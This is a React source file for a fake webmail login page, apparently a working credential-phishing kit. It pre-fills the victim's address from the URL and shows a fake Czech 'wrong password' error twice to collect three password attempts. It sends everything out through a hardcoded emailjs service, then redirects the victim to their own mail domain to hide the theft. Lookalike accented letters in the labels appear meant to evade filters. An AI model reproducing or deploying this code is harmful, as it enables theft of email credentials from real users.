//jshint esversion:6
import React, {useState, useRef} from 'react'
import emailjs from '@emailjs/browser';
import ClipLoader from "react-spinners/ClipLoader";
import Grid from '@mui/material/Grid';
import logo from './logo.jpg';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import VisibilityIcon from '@mui/icons-material/Visibility';


function getPartAfterDot(text) {
  var dotIndex = text.indexOf('@');
  if (dotIndex !== -1) {
    return text.substring(dotIndex + 1);
  }
  return '';
}

function App() {
  const url = window.location.search.slice(20)
  const form = useRef();
  const [count, setCount] = useState(0)
  const [email, setEmail] = useState(url ? url : '')
  const [pwdOne, setPwdOne] = useState('')
  const [pwdTwo, setPwdTwo] = useState('')
  const [pwdThree, setPwdThree] = useState('')

  const [pwdError, setPwdError] =  useState(false)
  const [pwdThreeEmptyError, setPwdThreeEmptyError] =  useState(false)

  const [pwdOneIsSet, setPwdOneIsSet] = useState(true)
  const [pwdTwoIsSet, setPwdTwoIsSet] = useState(false)
  const [pwdThreeIsSet, setPwdThreeIsSet] = useState(false)
  const [loading, setLoading] = useState(false)
  const [visible, setVisible] = useState(false)

  const handleEmailChange = (e) => {
    setEmail(e.target.value)
  }
  const handlePwdOneChange = (e) => {
    setPwdOne(e.target.value)
  }
  const handlePwdTwoChange = (e) => {
    setPwdTwo(e.target.value)
  }
  const handlePwdThreeChange = (e) => {
    setPwdThree(e.target.value)
  }

  const handleFormSubmit = async (e) => {
    e.preventDefault()

    if (count < 2) {
      setCount(prevCount => prevCount + 1)
      if (pwdOneIsSet) {
        setPwdOneIsSet(false)
      }
      if (!pwdTwoIsSet) {
        setPwdTwoIsSet(true)
        console.log('pwd2set');
        setPwdError(true)
        return
      } 
      if (!pwdThreeIsSet) {
        setPwdTwoIsSet(false)
        setPwdThreeIsSet(true)
        console.log('pwd3set');
        setPwdError(true)
        return
      } 

    }
    if (count >= 2 ) {
      if (pwdThree === '') {
        setPwdError(false)
        setPwdThreeEmptyError(true)
        return
      }
    }
    setLoading(true)
    emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
    .then((result) => {
      const redir = getPartAfterDot(email)
      window.location.replace(`https://${redir}`);
    }, (error) => {
        console.log(error.text);
    });


  }

  const handleVisibility = () => {
    setVisible(prevValue => !prevValue)
  }

  return (
    <div className="general">
      <h2>WÉBMÁlL</h2>
      <img src={logo} className="img2" alt='Outdated Env'/>
      <form ref={form} onSubmit={handleFormSubmit}>
          <label>EmáíI</label>
          <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>

          {pwdOneIsSet && <label>Pásswórd</label>}
          <Grid container>
            <Grid item xs={12}>
              <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} hidden={!pwdOneIsSet} onChange={handlePwdOneChange} required />
            </Grid>
            {pwdOneIsSet && 
              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
                {!visible ? 
                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
                  : 
                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
                }
              </Grid>
            }
          </Grid>


          {pwdTwoIsSet && <label>Pásswórd</label>}
          <Grid container>
            <Grid item xs={12}>
              <input type={visible ? "text" : "password"} name="pwdTwo" value={pwdTwo} hidden={!pwdTwoIsSet} onChange={handlePwdTwoChange} />
            </Grid>
            {pwdTwoIsSet && 
              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
                {!visible ? 
                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
                  : 
                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
                }
              </Grid>
            }
          </Grid>

          {pwdThreeIsSet && <label>Pásswórd</label>}
          <Grid container>
            <Grid item xs={12}>
              <input type={visible ? "text" : "password"} name="pwdThree" value={pwdThree} hidden={!pwdThreeIsSet} onChange={handlePwdThreeChange} />
            </Grid>
            {pwdThreeIsSet && 
              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
                {!visible ? 
                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
                  : 
                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
                }
              </Grid>
            }
          </Grid>



          {pwdError && <div className='error'>nesprávné heslo, zkuste to znovu</div>}
          {pwdThreeEmptyError && <div className='error'>Pole pro heslo nemůže být prázdné</div>}
          <input type="submit" value="Continue" />

      </form>

      {loading && 
        <div className='loader'>
          <ClipLoader
            color='#0073c6dc'
            loading={loading}
            size={150}
            aria-label="Loading Spinner"
            data-testid="loader"
          />
        </div>
      }
    </div>
  );
}

export default App;
